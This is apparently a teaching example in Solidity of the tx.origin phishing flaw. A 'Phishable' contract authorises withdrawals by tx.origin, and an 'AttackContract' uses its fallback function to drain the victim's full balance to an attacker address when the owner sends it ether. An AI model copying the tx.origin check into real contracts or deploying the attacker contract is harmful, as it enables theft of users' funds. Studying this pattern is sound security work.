pragma solidity 0.8.7;
contract Phishable {
    address public owner;

    constructor (address  _owner) payable {
        owner = payable(_owner);
    }
    
    fallback() external payable {} // collect ether

    function withdrawAll(address _recipient) public {
        require(tx.origin == owner);
         payable(_recipient).transfer(address(this).balance);
    }
}

import "Phishable.sol";

contract AttackContract {

    Phishable phishableContract;
    address attacker; // The attackers address to receive funds.
constructor (Phishable _phishableContract, address _attackerAddress) 
{
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    fallback() external payable {
        phishableContract.withdrawAll(attacker);
    }
}
